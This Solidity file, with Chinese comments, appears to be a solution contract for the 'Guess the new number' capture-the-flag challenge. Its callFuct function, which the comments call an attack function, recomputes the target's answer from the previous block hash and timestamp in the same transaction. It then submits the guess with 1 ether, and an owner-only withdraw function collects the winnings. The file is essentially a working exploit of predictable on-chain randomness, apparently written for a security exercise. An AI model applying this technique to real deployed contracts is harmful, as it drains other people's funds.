//SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface GuessTheNewNumberChallenge {
    function guess(uint8) external payable;

    function isComplete() external returns (bool);
}

contract GuessTheNewNumberChallengeCall {
    uint8 public answer;
    address public owner;
    bool public check;
    //注意，当接口只为查询，可以只在函数内生命。但当有gas执行等动作，建议使用公用变量，消费gas
    GuessTheNewNumberChallenge public _interface;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "you are not owner!");
        _;
    }

    //攻击func ,并且调用
    function callFuct(address addr) public payable {
        require(addr != address(0), "Address can not be Zero");
        uint8 an = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        _interface = GuessTheNewNumberChallenge(addr);
        _interface.guess{value: 1 ether}(an);
    }

    // 为了能从攻击合约中，取回eth
    function withdraw(address payable _to) public payable onlyOwner {
        _to.transfer(address(this).balance);
    }

    function deposit() public payable {}

    // 为了使合约能接收eth, 必须需要receive函数
    receive() external payable {}
}
